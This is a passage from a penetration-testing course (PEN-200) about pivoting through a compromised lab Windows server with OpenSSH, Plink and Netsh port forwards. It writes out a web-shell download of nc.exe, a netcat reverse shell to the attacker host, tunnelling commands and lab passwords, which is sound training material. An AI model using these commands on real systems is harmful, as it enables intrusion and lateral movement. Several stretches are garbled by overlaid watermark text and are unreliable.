+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - The hostname used for
+
+this connection (192.168.50.64:3389)
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - does not match the name
+
+given in the certificate:
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - Common Name (CN):
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - MULTISERVER03
+
+[15:46:35:301] [468172:468173] [ERROR][com.freerdp.crypto] - A valid certificate for
+
+the wrong name should NOT be trusted!
+
+Certificate details for 192.168.50.64:3389 (RDP-Server):
+
+Common Name: MULTISERVER03
+
+Subject:             CN = MULTISERVER03
+
+Issuer:              CN = MULTISERVER03
+
+Thumbprint:
+
+f5:42:78:8b:76:56:64:ba:05:73:75:c2:04:3c:74:56:6f:ba:d3:ed:f0:87:9e:ce:ee:9a:ba:e2:19
+
+:ff:56:df
+
+The above X.509 certificate could not be verified, possibly because you do not have
+
+the CA certificate in your certificate store, or the certificate has expired.
+
+PD[floo1re5:yasou4nue6:ilt3x8rou:otski7t2me8a]ttzohen[t4ehe:6ab8UOo1pv7S2e/eE:n4caS6esSr8Lt1tedi7rn3foci]cuma[etEnReRt?Oa(tRYi]/o[cTno/omN.n)wih<cnowupWr>hi.ytto<l/iomcaweudd>zoane]pri-vaUtneabClAe  to  the store.
+                                                                                                                                                                                                       to  find a match
+
+[15:46:39:538] [468172:468173]  [[IINNFFOO]][[ccJooemmf..fffrrreeeyeerrddpp..ggddii]]  -  Local framebuffer format
+PIXEL_FORMAT_BGRX32                                                                    -  Remote framebuffer format
+[15:46:39:539] [468172:468173]
+PIXEL_FORMAT_BGRA32
+L[D[[y1o1155a5nad:::444em66d6i:::c4f442a00V::ik:11r2e57t75bu64]a]]acl[k[[C4e446n6h68a88dn111nf77722o2e:rl::444666rr8d88d1p1p17g7s7O3f3n3S]d]x]-5[[[77III5NNN2FFF1OOO9]]]0[[[cccooommm...fffrrreeeeeerrrdddppp...ccclhhaaiennnnnteell.sxs..11rdrd]pdys-nnvdLc.o.cgclolineienEntr]tr]or--I[nsLfotoaadtiicn]g
+LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
+
+           Listing 603 - Connecting to the RDP server on MULTISERVER03 using xfreerdp.
+
+Once we have a connection open, we can open a cmd.exe window and determine whether SSH is
+on the box using where ssh.
+
+C:\Users\rdp_admin><cu>where ssh</cu>
+<cr>C:\Windows\System32\OpenSSH\ssh.exe</cr>
+
+C:\Users\rdp_admin>
+
+                           Listing 604 - Finding ssh.exe on MULTISERVER03.
+
+Success! We found ssh.exe on this machine.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                    644
+                                                                                                            Penetration Testing with Kali Linux
+
+Notably, the version of OpenSSH bundled with Windows is higher than 7.6, meaning we can use it
+for remote dynamic port forwarding.
+
+C:\Users\rdp_admin><cu>ssh.exe -V</cu>
+<cr>OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2</cr>
+
+                   Listing 605 - The version of OpenSSH client that is bundled with Windows is higher than 7.6.
+
+At this point, we can establish a remote dynamic port forward to our Kali machine--mirroring the
+approach we previously used. We'll pass the port 9998 to -R and authenticate as kali back on our
+Kali machine.
+
+C:\Users\rdp_admin><cu>ssh -N -R 9998 kali@192.168.118.4</cu>
+The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
+ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <cu>yes</cu>
+Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
+kali@192.168.118.4's password:
+
+                   Listing 606 - Connecting back to our Kali machine to open the remote dynamic port forward.
+
+We can check that the SOCKS proxy port is opened on our Kali machine using ss.
+
+kali@kali:~$ <cu>ss -ntplu</cu>
+
+Netid      State      Recv-Q               Send-Q                                                     Local Address:Port
+
+Peer Address:Port     Process
+
+<cr>tcp      LISTEN      0                      128                                                         127.0.0.1:9998
+
+0.0.0.0:*</cr>
+
+tcp        LISTEN     0                    128                                                              0.0.0.0:22
+
+0.0.0.0:*
+
+<cr>tcp      LISTEN      0                      128                                                         [::1]:9998
+
+[::]:*</cr>                                ft1oor2tu8hseeopJtheenifsfSrsOeoCycKSkWephtoi.rttloonwour
+
+tcp        LISTEN     0                                                                                               [::]:22
+                                                                                                            machine with ss.
+[::]:*
+
+                   Listing 607 - Checking                                                             Kali
+
+Let's update /etc/proxychains4.conf
+
+[####kaPrlio@xkyLalipsi(:tro*~]$axyur<athwctuy:>pttTeyashp:eeilsht/rtsuaetptfppc,fo/isprcOortSceoi-kdxs5y:s774cs5"h,i2abm1siap9lson0icsy4ck.sf"co5-,orhwntrfatr<apdw/cedu">utsoert/hpeaspsr"o-xsyocwkisth)out modification.
+
+# add proxy here ...
+
+# meanwile
+
+# defaults set to "tor"
+
+<cr>socks5 127.0.0.1 9998</cr>
+
+                      Listing 608 - Proxychains configuration file having been edited.
+
+Now that the configuration file is pointing at our remote dynamic port forward SOCKS port, we
+can run psql through proxychains to connect to the PostgreSQL database as the postgres user
+(with the password D@t4basePassw0rd!). We'll use the same psql command we would as if
+connecting directly from MULTISERVER03.
+
+kali@kali:~$ <cu>proxychains psql -h 10.4.50.215 -U postgres</cu>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                     645
+                                                                             Penetration Testing with Kali Linux
+
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK
+Password for user postgres:
+[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
+compression: off)
+Type "help" for help.
+
+postgres=# <cu>\l</cu>
+
+                              List of databases
+
+Name | Owner | Encoding | Collate | Ctype | Access privileges
+
+------------+----------+----------+-------------+-------------+-----------------------
+
+confluence | postgres | UTF8  | en_US.UTF-8 | en_US.UTF-8 |
+
+postgres | postgres | UTF8    | en_US.UTF-8 | en_US.UTF-8 |
+
+template0 | postgres | UTF8   | en_US.UTF-8 | en_US.UTF-8 | =c/postgres                                                                                        +
+
+            |           |     |                                           |  | postgres=CTc/postgres
+
+template1 | postgres | UTF8   | en_US.UTF-8 | en_US.UTF-8 | =c/postgres                                                                                        +
+
+            |           |     |                                           |  | postgres=CTc/postgres
+
+(4 rows)
+
+postgres=#
+
+               Listing 609 - Connecting to the PostgreSQL server with psql and Proxychains.
+
+The connection was a success! We're now interacting with the PostgreSQL database on
+PGDATABASE01 through an SSH remote dynamic port forward initiated from the OpenSSH client
+running on a Windows Server 2022 machine.
+
+tImnhratochuhisginhseeaScnStiSHoSnsH, ewrrveeem'vre.otseedt yunpama iccopnonretcftoiorwn atordamPaodseWthgbireettlSwoQewLendaatWabiansdeowrusnSnSinHg  on a    Linux server
+                                                                                                                                                       client  and our Kali
+
+dTehfisauteltc. hInt iqpureovisidpeasrtpicaurliatyrlywuisthefuLlinounxmtoudnJenerefnlfinrWegyinwdoowrksflosywsst,emmsawkinhgereitOvpaelnuSaSblHe       is installed by
+                                                                                                                                                        in mixed-OS
+
+edraennemvpdiloroovytnhemmdeeeonnOrtstprs.ee.snHtSroiScwHteedvcetlhri,eenabtvianiiaslaOrbiSe-aisl5ilt.r7yeT7a5hdd2iesy1p9me0innedstshtaolodlendis--OmScoovmsetmrseoifofnenctaiinvnedmwwohhdeenetrhRneDr PeandatmecrcipenrsiisssteriastWoarvisnadihlaoabwvlees
+
+19.4.2 Plink
+
+Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not
+guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of
+Windows, the network administrators may have removed it.
+
+Nevertheless, network administrators still need remote administration tools. Most networks have
+SSH servers running somewhere, and administrators need tools to connect to these servers from
+Windows hosts. Before OpenSSH was so readily available on Windows, most network
+administrators' tools of choice were PuTTY and its command-line-only counterpart, Plink.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                       646
+                                                                                                                              Penetration Testing with Kali Linux
+
+One of the benefits of using tools that are popular with network administrators is that they will
+rarely be flagged by traditional antivirus software. This makes them appealing to attackers, since
+using them is relatively covert compared to more security-adjacent tools with similar
+functionality.
+
+We'll use Plink in this section, since in a security assessment, we will more likely have a shell than
+GUI access. The Plink manual explains that much of the functionality the OpenSSH client offers is
+also built into Plink (although one notable feature Plink doesn't have is remote dynamic port
+forwarding).
+
+Many 3rd-party SSH clients for Windows provide port forwarding features. We're using Plink in
+this case because it's common, lightweight, and specifically designed to run on the command
+line.
+
+Let's get familiar with Plink by using it in the lab in a revised scenario. In this scenario, we find that
+MULTISERVER03 now has a web application on TCP port 80 exposed. All other inbound ports are
+blocked by a firewall, so RDP is no longer available either. The layout is much like the following
+diagram:
+
+                                                              Whitlow
+                                                    Jeffrey
+                       Figure 270: MOUSL-T5IS7E7R5V2E1R9003 behind a firewall, with only port 80 exposed
+We can compromise MULTISERVER03 through the web application, drop a web shell on it, and
+gain a reverse shell using that. We have previously found credentials we could use to connect to
+the RDP service. This is blocked by the firewall, so we can't connect directly. The OpenSSH client
+has also been removed, so we can't create a remote port forward using that.
+
+However, we have another option: we can create a remote port forward using Plink.
+
+Let's try this out. First, we will get an interactive reverse shell from MULTISERVER03. From our
+initial exploitation, we uploaded a basic web shell at /umbraco/forms.aspx. We can browse to
+this URL and run whatever Windows commands we want - these will be run as the iis
+apppool\defaultapppool user. We can use this web shell to download nc.exe to MULTISERVER03,
+which we will then use to send a reverse shell back to our Kali machine.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  647
+                                                                                                    Penetration Testing with Kali Linux
+
+ Info
+MULTISERVER03 is already "pre-compromised" in the lab. At this point, you can browse
+to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You
+should see a webshell page, which will let you run arbitrary commands on
+MULTISERVER03.
+
+To download nc.exe onto MULTISERVER03, we first need to host it on a server that
+MULTISERVER03 can access. We can easily configure Apache2 on our Kali machine to do this.
+Apache2 is installed by default on Kali, so we just need to start the apache2 service.
+
+kali@kali:~$ <cu>sudo systemctl start apache2</cu>
+[sudo] password for kali:
+
+kali@kali:~$
+
+                                      Listing 610 - Starting Apache2.
+
+We can now locate nc.exe from our Kali windows-resources/binaries directory and copy it to the
+Apache2 web root for download.
+
+kali@kali:~$ <cu>find / -name nc.exe 2>/dev/null</cu>
+<cr>/usr/share/windows-resources/binaries/nc.exe</cr>
+
+kali@kali:~$ <cu>sudo cp /usr/share/windows-resources/binaries/nc.exe
+/var/www/html/</cu>
+
+                                            Listing 611 - Copying nc.exe to the Apache2 webroot.
+
+With the binary in place, we can initiate the download from MULTISERVER03. We will use a
+
+PowerShell wget one-liner from our web shell to download nc.exe.
+                               (a-Ucroi hmttmp:a/n/1d9t2h.a1t68w.i1ll1iW8nh.s4itt/rnuloccw.tePxeo)waenrdShwerllitteoitdtoowCn:l\oWadindnocw.esxe\Tferommp
+From the web shell, we'll run
+our Kali machine web server
+<otOCo:cnn\uCcMW>e:ip\LUWnotishLdwtieiToennwrIgdPSsso6oE\h1wwTeR2elsVe-ml\TrETpShR\weehng0mePce3olp.tlwwec\en-xoirtUeScmhr<h.eei/m-xOlcleachuuont>otmFtdOnipmSlieM:-sa./5nUeP/7dx71Luwe59Tte2c2It1Suu.o9s1tEg0ee6Redt8otVJ,.hedEo1efouR1rfw,8r0rnw.ep3l4oyea.a/ydrnluocnnc.a.edetxhxeieestofd-oMoOlluwUotLwnFTliiIonSlaEgeRd: VeEdRf0r3otmhroouughr
+                                                                                                                                                                                                                                                                                                                                                     the web shell.
+
+                                                                                                                                                                                                                                                                                                                                                     Apache2 server
+
+We can now prepare a Netcat listener on port 4446 from our Kali machine to catch the reverse
+shell connection.
+
+kali@kali:~$ <cu>nc -nvlp 4446</cu>
+listening on [any] 4446 ...
+
+                                            Listing 613 - The Netcat listener on our Kali machine.
+
+Once the listener is running, we'll execute nc.exe on MULTISERVER03 using the web shell again,
+passing -e to execute cmd.exe once the connection is established.
+
+<cu>C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446</cu>
+                               Listing 614 - The nc.exe reverse shell payload we execute in the web shell.
+
+The shell quickly hits our listener.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                             648
+                                                                          Penetration Testing with Kali Linux
+
+...
+listening on [any] 4446 ...
+connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
+Microsoft Windows [Version 10.0.20348.825]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+                                     Listing 615 - The shell from nc.exe caught by our Netcat listener.
+
+We now want to download Plink to MULTISERVER03. On our Kali machine, we can copy plink.exe
+from windows-resources/binaries to the Apache2 web root.
+
+kali@kali:~$ <cu>find / -name plink.exe 2>/dev/null</cu>
+<cr>/usr/share/windows-resources/binaries/plink.exe</cr>
+
+kali@kali:~$ <cu>sudo cp /usr/share/windows-resources/binaries/plink.exe
+/var/www/html/</cu>
+[sudo] password for kali:
+
+kali@kali:~$
+
+              Listing 616 - Copying plink.exe to our Apache2 webroot.
+
+In our reverse shell, we'll again use the PowerShell one-liner to download plink.exe from our Kali
+machine to C:\Windows\Temp.
+
+c:\windows\system32\inetsrv><cu>powershell wget -Uri http://192.168.118.4/plink.exe -
+OutFile C:\Windows\Temp\plink.exe</cu>
+powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
+oRfMcWIno:nUrio\twthtwpLhhiatTetiinrshoIdSdlenooEcw,oPwRawpsiltiVsb\nheeEsak'l,PlyRcelspk0lixenta3eitekns'csmRtsiues3Dtt2rsvahfP\eaebeitcprlneyseoeuosnrtoptciosfmkfrwMrePviolta>laULOminwirvSsLk-atteToion5ilIug7awSwtr7hb6Eai5K1etlRne2h7a1OVt-ol9iEtPpan0omleRinMnJo0rkaeeSp3UcdfmSeohLftwHnhioTrnnaetIeocleSyto.nlaEiwTedWpRtneehhhoVditeewrtEtrtocleaKRoomtnfa0hwmotel3oirtC,mwtSoew:fSaoafpeHorlnddorecdwrsrat.sesanfyrorovbndretewtprahg,aaxiaanrcttndkopdecwrsteotseehpmtteaoucmrR.iapnaDnganPdtraoe.scmAeucrfseovteesetesrritt.pphtooherrett-
+We will also pass the username (-l) and password (-pw) directly on the command line.
+
+      Warning
+     This might log our Kali password somewhere undesirable! If we're in a hostile network,
+     we may wish to create a port-forwarding only user on our Kali machine for remote port
+     forwarding situations.
+
+c:\windows\system32\inetsrv><cu>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR
+PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4</cu>
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389
+192.168.118.4
+The host key is not cached for this server:
+
+   192.168.118.4 (port 22)
+You have no guarantee that the server is the computer
+you think it is.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                 649
+                                                                                                                                                         Penetration Testing with Kali Linux
+
+The server's ssh-ed25519 key fingerprint is:
+   ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
+
+If you trust this host, enter "y" to add the key to
+PuTTY's cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n, Return cancels connection, i for more info) <cu>y</cu>
+Using username "kali".
+Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
+kali@kali:~$
+
+                                        Listing 618 - Making an SSH connection to the Kali machine.
+
+We are presented with a prompt asking if we want to store the server key in the cache.
+
+ Info
+
+In much the same way that it's not possible to accept the SSH client key cache prompt
+
+from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we
+
+also won't be able to respond to this prompt. An easy solution in that case would be to
+
+automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command.
+Tc-Rohmi1s2mw7.ai0lln.e0dm.1wu:9ola8ut3led3tb:1he2e:7cc.mo0n.d0f..ie1rmx:3ea3/t8ico9ne1ct9hh2oa.t1yw6|8e...e4ux1se.u7-a.sWlslyhhitty-llpkoewawli -hpewn
+                                                                                                                                                         prompted. The entire
+                                                                                                                                                         <YOUR PASSWORD HERE>
+
+Nk<tWtucceacsepltrperi>ictds@akc:nSLaL(ptIl(IciSS"aoTT:tpnLE~yeEf$tNINirhSm0T0<RoeEnctcN3uhv">a-s0,tQpstihS-d51ene=2pnt18pd0ol41-rtu28Qh<82/5LaOc5oSsu,c-o>fa5pdl77=e5030An2.).de1)010dd92..r0o070e...nsJ000seo:.::fu280Pfr2.0or1rKe:tya9li8Pm3e3earch00Ai..dn00de..r000eu...ss000sin::.:g**0P.os0rs:t.*<P/rcorc>ess
+
+tcp LISTEN 0  128  [::]:22                                                [::]:*
+
+kali@kali:~$
+
+              Listing 619 - Port 9833 opened on the Kali loopback interface.
+
+Port 9833 is opened on the loopback interface of our Kali machine.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                              650
+                                                                                                                                                                                                             Penetration Testing with Kali Linux
+
+Figure 271: The traffic flow from the listening port opened on our Kali server to the RDP port open on MULTISERVER03,
+                                                                behind the firewall
+
+Now we can connect to port 9833 on our Kali loopback interface with xfreerdp as the rdp_admin
+user. To specify a custom RDP port in xfreerdp, we simply append :9833 to the IP address.
+
+kali@kali:~$ <cu>xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833</cu>
+
+...
+
+Certificate details for 127.0.0.1:9833 (RDP-Server):
+
+     Common Name: MULTISERVER03
+
+     Subject:  CN = MULTISERVER03
+4a:11:2dTI:shdsu8um:eb0pr3r::i8net::dd:C5Nc:=f2M:UcL4T:I7S1E:R7VeE:R1053:1d:20:fbW:hi6t2l:o3wf:c6:eb:3d:77:1e:ea:44:47:10:42:49
+PtT:lhhfeaeea:1saCbeAe:o6cvleoeaorXkti.5fa0it9catchteeertOipinefiynocSSuaLtredccoerocuutilmefdinntcaoattteiobJsenetfoovfrenrree,hiyofwoierdto,thaepodscdseiarbtiplryfiibvcaaectteaeusChaeAstyooexupthideorends.ottoreh.ave
+
+D.[fo.0o5.ry:ou1nu1:itx17r:utsi4tm30eLz]tishotie[nn1eg0:a6b72U2o0vS3-3e/CE2oca:ns1en0trete7cti2rOinn3fSgi3-tc35o]a7t7th5e[e2E?R1RD9R(P0YOsR/eT]r[/veNcro)wmi.<thcwiuxfn>reype<rr./dctp,uitm>herozuognhet]he  - Unable to find     a  match
+                                                                                                                                                                                                             Plink port forward.
+
+The connection succeeds, and we get an RDP connection through our Plink remote port forward!
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                             651
+                                                                                                                        Penetration Testing with Kali Linux
+
+                    Whitlow
+
+In  this  section,  weFiguusree2d72P: lCinoknnetoctecdrteoaMteULaTJISreeEfRmfVroEeRtye03pthorrotugfoh rtwhearredmottoe  port forward.  RDP  service  on
+
+                                                                                                                        access the
+
+PrMreelismUntLkroiTcvoIteSfifdvEee.RrssVIhtaE'esRllil0gsw,h3ait.dwnWedelyeiegxhauptlsslaooelrtdecedornbnOpaySsipt-iidiv5naee7gdr7ewm5kd2hei1nyes9isnos0ttmrGroaUektoeItsrahscei,ncoterwoesthPsicilciiasnhlkupanmrsaoavbakaleseilmoasblusliettiwoonhlre.eswnshiensnituiOastppiniecgnioSPuSlsiHnkhinainsmmbeaoenrney
+
+environments. Because it's a standalone executable, Plink is well-suited for situations where only
+
+shell access is available and files can be uploaded. However, it lacks support for remote dynamic
+
+port forwarding and may expose credentials if passwords are passed directly on the command
+
+line.
+
+19.4.3 Netsh
+
+There is a native way to create a port forward on Windows we should explore: the built-in firewall
+configuration tool Netsh (also known as Network Shell). Using Netsh, we can set up a port forward
+with the portproxy subcontext within the interface context. While Netsh requires administrative
+privileges to create a port forward on Windows, it can be very useful in some restrictive situations.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                             652
+                                                                                                                              Penetration Testing with Kali Linux
+
+Let's consider a slight modification of the previous scenario. MULTISERVER03 is serving its web
+application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the
+WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port
+3389, meaning we are able to log in over RDP directly.
+
+                                                Figure 273: The network setup for this scenario
+
+We want to SSH into PGDATABASE01 directly from our Kali machine. To do this, we'll need to
+create a port forward on MULTISERVER03 that will listen on the WAN interface and forward
+packets to the SSH port on PGDATABASE01.
+ukTasolinsigtUptwT@ahkrhAxiraitavfetIChtlrniselpiUefaieeono:gAdtr~tretmdCot$ipsnpaimrgnt<oacoicxausgcumyytpoa>riusabxnaauntefk.obptrea.roceIapoensrntrrtnituyfdvthomepicilrsexhwbtg/ealuaoeOixnn:rsSfagdgr-,tme,dh5sbslp7oepel.7_otlUn5Tea'cs2ed,Ahk1twmRiCss9iinDeh0nim'sPorienJt/enedthpraeofieu:rnrftrenfPsraacs@necttesicyhlneystoaugwWcnitp0nhoictisirtnmeoit.dnrlm!mnMoa.ow/aUHssvnLhot:dTew1clrI9alSee2osvqE.eveuR1seri6V,rrwe8wER.seReD5a0w0Psd3.himlu6olf4snruio<nienl/dimesgcdtbuaroea>tnuoatirarvtKcaeinckaoemliuminntdachine
+
+[07:48:02:576] [265164:265165] [WARN][com.freerdp.crypto] - Certificate verification
+failure 'self signed certificate (18)' at stack position 0
+[07:48:02:577] [265164:265165] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
+[07:48:03:685] [265164:265165] [ERROR][com.winpr.timezone] - Unable to find a match
+for unix timezone: US/Eastern
+[07:48:03:886] [265164:265165] [INFO][com.freerdp.gdi] - Local framebuffer format
+PIXEL_FORMAT_BGRX32
+[07:48:03:886] [265164:265165] [INFO][com.freerdp.gdi] - Remote framebuffer format
+PIXEL_FORMAT_BGRA32
+[07:48:03:940] [265164:265165] [INFO][com.freerdp.channels.rdpsnd.client] - [static]
+Loaded fake backend for rdpsnd
+[07:48:03:940] [265164:265165] [INFO][com.freerdp.channels.drdynvc.client] - Loading
+Dynamic Virtual Channel rdpgfx
+
+                                          Listing 621 - Connecting to the RDP server with xfreerdp.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  653
+                                                                                                              Penetration Testing with Kali Linux
+
+In our RDP session, we can run cmd.exe as administrator to open a command window.
+
+Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from
+an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the
+external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to
+port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).
+
+C:\Windows\system32><cu>netsh interface portproxy add v4tov4 listenport=2222
+listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215</cu>
+
+C:\Windows\system32>
+
+                            Listing 622 - The portproxy command being run.
+
+Although we don't receive any output from the command, we can confirm that port 2222 is
+listening using netstat.
+
+C:\Windows\system32><cu>netstat -anp TCP | find "2222"</cu>
+
+TCP <cr>192.168.50.64:2222</cr>                           0.0.0.0:0                                                 LISTENING
+
+C:\Windows\system32>
+                          Listing 623 - netstat showing that TCP/2222 is listening on the external interface.
+
+We can also confirm that the port forward is stored by issuing the show all command in the netsh
+interface portproxy subcontext.
+
+C:\Windows\system32><cu>netsh interface portproxy show all</cu>
+
+Listen on ipv4:             Connect to ipv4:
+
+Address          Port       Address                       P2-2o-r-Wt-hi-t-l-o-w--
+                            ---------------
+--------------- ----------  10.4.50.215
+
+192.168.50.64 2222
+
+                           Listing 624 - Listing all the  ipsoJrstepefrtfouxryepyp. ort  forwarders  set  up  with  Netsh.
+
+The  port  is  listening,  and the port forward
+
+                            OS-57752190
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                       654
+                                                                                                       Penetration Testing with Kali Linux
+
+Figure 274: The port forward set up on MULTISERVER03 will forward packets received on port 2222 to port 22 on
+                                                             PGDATABASE01
+
+However, there's a problem. We can't connect to port 2222 from our Kali machine. We'll
+specifically check port 2222 using nmap.
+
+kali@kali:~$ <cu>sudo nmap -sS 192.168.50.64 -Pn -n -p2222</cu>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:27 EDT
+Nmap scan report for 192.168.50.64
+Host is up (0.00055s latency).
+
+PORT          STATE SERVICE
+
+<cr>2222/tcp filtered EtherNetIP-1</cr>
+
+MAC Address: 00:0C:29:A9:9F:3D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
+                               Listing 625 - Nmap showing that port 2222 on MULTISERVER03 is filtered.
+
+The response shows that port 2222 is filtered. It's most likely that the Windows Firewall is
+blocking inbound connections to port 2222.
+
+                                                                            Whitlow
+
+                                      Jeffrey
+
+Figure  275:  The  Windows  firewall  blockOinSg-5o7ur7a5t2te1m9o0nptthtoe  connect to port  2222  on  MULTISERVER03  from  our  Kali  machine
+                                                                            WAN network
+
+To access it, we need to poke a hole in the firewall on MULTISERVER03.
+
+ Caution
+We'll also need to remember to plug that hole as soon as we're finished with it!
+
+We can use the netsh advfirewall firewall subcontext to create the hole. We will use the add rule
+command and name the rule "port_forward_ssh_2222". We need to use a memorable or
+descriptive name, because we'll use this name to delete the rule later.
+
+We'll allow connections on the local port (localport=2222) on the interface with the local IP
+address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                               655
+                                                                                                                                                            Penetration Testing with Kali Linux
+
+C:\Windows\system32> <cu>netsh advfirewall firewall add rule
+name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222
+action=allow</cu>
+<cr>Ok.</cr>
+
+C:\Windows\system32>
+                                      Listing 626 - Poking a hole in the Windows Firewall with Netsh.
+
+The command completes successfully with an "Ok." response. We can check how the port
+appears from our Kali machine again.
+
+kali@kali:~$ <cu>sudo nmap -sS 192.168.50.64 -Pn -n -p2222</cu>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:28 EDT
+Nmap scan report for 192.168.50.64
+Host is up (0.00060s latency).
+
+PORT  STATE SERVICE
+
+<cr>2222/tcp open EtherNetIP-1</cr>
+
+MAC Address: 00:0C:29:A9:9F:3D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+                                Listing 627 - Nmap showing that port 2222 on MULTISERVER03 is open.
+
+The port is open! This allows us to SSH to port 2222 on MULTISERVER03, which behaves exactly
+like connecting to port 22 on PGDATABASE01.
+
+kali@kali:~$ <cu>ssh database_admin@192.168.50.64 -p2222</cu>
+
+The authenticity of host '[192.168.50.64]:2222 ([192.168.50.64]:2222)' can't be
+
+established.
+
+ETWhdAaoDrhasit2re5tnas~5yibs/1hoan..9sgouses:sks_thPaeu/ykerdkermenfymioynaiw@onninuseg1_9nehtw2rko.nplasynro1ti6twsnan8:t.dt55dob:y0iesc.d[o6thShn'4a[te'HsA1ish2f9neu5op2d.lea6:1slnco6s3oaww8TRmni.o5Cernneg01d]J.Z:ceot6wftt4ifhln]r:geQee2ry2(xyL2nWTea2hi'smSt/e0lns(4oEh/owV/aD[d32Z5df5irMneb1Fs9gnes)r3ets0p:lroiYFnttuheQ])V?lQHisj<tcUquol>yYfezsJkno<.o/wcun>
+Welcome to Ubuntu  2hhh0tt.t0ttt4ppp.sss4::://////LTluhObaeSSnul-(npd5G.st77uNuc5Uba.2u/pc1neLo9tmi.0un/c.aaudcxnvoonma5ni.tc4a.ag0l.e-c1o2m2-generic  x86_64)
+
+ * Documentation:
+ * Management:
+ * Support:
+
+System information as of Sun 21 Aug 2022 10:40:26 PM UTC
+
+System load: 0.0             Processes:                                                                                                                231
+Usage of /: 60.9% of 7.77GB
+Memory usage: 16%            Users logged in:                                                                                                          0
+Swap usage: 0%
+                             IPv4 address for ens192: 10.4.50.215
+
+                             IPv4 address for ens224: 172.16.50.215
+
+0 updates can be applied immediately.
+
+Last login: Sat Aug 20 21:47:47 2022 from 10.4.50.63
+database_admin@pgdatabase01:~$
+
+                               Listing 628 - SSHing into PGDATABASE01 through the Netsh port forward.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                    656
+                                                                                                                              Penetration Testing with Kali Linux
+
+Great! We're SSH'd into PGDATABASE01 through a port forward set up on MULTISERVER03
+using Netsh.
+
+  Figure 276: Connecting to port 2222 on MULTISERVER03 through the hole we made in the Windows firewall
+
+ Info
+Once we're done with the connection, we need to remember to delete the firewall rule we
+just created.
+
